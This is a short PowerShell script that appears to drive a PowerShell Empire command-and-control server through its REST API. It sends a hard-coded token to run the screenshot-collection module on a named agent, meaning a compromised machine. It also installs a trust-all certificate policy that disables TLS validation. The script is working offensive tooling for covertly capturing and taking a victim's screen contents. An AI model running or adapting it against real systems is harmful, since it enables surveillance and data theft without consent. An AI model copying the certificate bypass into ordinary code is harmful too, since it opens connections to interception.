Param(
    $EmpireBox = '192.168.200.108',
    $EmpireToken = 'svcx1oa9ynrqy0pc089qs4s0askox1evhk3c9k6w',
    $EmpirePort = '1337',
    $AgentName = "1C5UE7S8",
    $ModuleName = "powershell/collection/screenshot",
    $Options = "" 
)

#[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
add-type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {
    public bool CheckValidationResult(
        ServicePoint srvPoint, X509Certificate certificate,
        WebRequest request, int certificateProblem) {
        return true;
    }
}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy


$moduleURI = "https://$EmpireBox`:$EmpirePort/api/modules/"+$ModuleName+"?token=$EmpireToken"
$PostBody = "{`"Agent`":`"$AgentName`"}"

#Get Agents
$ModuleExecution = Invoke-WebRequest -Method Post -uri $moduleURI -Body $PostBody -ContentType 'application/json'
       

$ModuleExecution = $ModuleExecution.Content | ConvertFrom-Json


##TODO Module History... for now just report status
$Return = (($ModuleExecution.msg) + " Execution Status: " + ($ModuleExecution.success))

return $Return 